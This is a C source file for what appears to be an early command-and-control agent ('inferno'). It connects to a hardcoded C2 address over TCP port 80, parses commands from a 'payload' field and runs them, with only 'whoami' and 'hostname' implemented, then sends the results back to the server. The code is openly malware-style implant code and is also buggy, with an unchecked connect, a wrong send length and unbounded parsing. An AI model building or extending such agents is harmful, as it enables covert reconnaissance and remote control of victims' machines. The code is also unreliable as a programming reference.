#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define IP "127.0.0.1"
#define PORT_HTTP 80

//networked part
void networking();

//executing command
char *executing(char *receive);

//whoami command
char *whoamiCommand();

//hostname command
char *hostnameCommand();

int main() {
    networking();
}

void networking() {
    //socket http
    printf("Initializing socket...\n");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    //preparing http address
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_HTTP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //connect http
    printf("Connecting...\n");
    int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
    if (inferno_connect == -1) 
        printf("Please be sure server port: %d is open\n", PORT_HTTP);
    puts("Connected");
    
    while (1) {
    	//receiving http payload
    	char receive[2048];
    	int inferno_receive = recv(inferno_socket, receive, 1024, 0);
    	printf("Receiving:\n\n%s\n\n", receive);
        
        //parsing to extract payload
        char *content_length = strstr(receive, "{'payload':");
        content_length += strlen("{'payload':");
        char *command_start = strtok(content_length, "'");
        char *command = strtok(command_start, "'");
        char *task = executing(command);
        printf("Executing: '%s'\n", command);

    	//sending payload result
    	printf("Sending: '%s' from agent...\n", task);
    	ssize_t inferno_send = send(inferno_socket, task, sizeof(task), 0);
    	printf("Sent\n\n");
    }
}

char *executing(char *receive) {
    char *task;

    //execute whoami
    if (strcmp(receive, "whoami") == 0) {
        task = whoamiCommand();

    //execute hostname
    } else if (strcmp(receive, "hostname") == 0) {
        task = hostnameCommand();

    //payload not yet build
    }else {
        task = "NULL";
    } return task;
}

//whoami syscall
char *whoamiCommand() {
    char *username = getlogin();
    return username;
}

//hostname syscall
char *hostnameCommand() {
    static char hostname[1024];
    gethostname(hostname, 1024);
    return hostname;
}
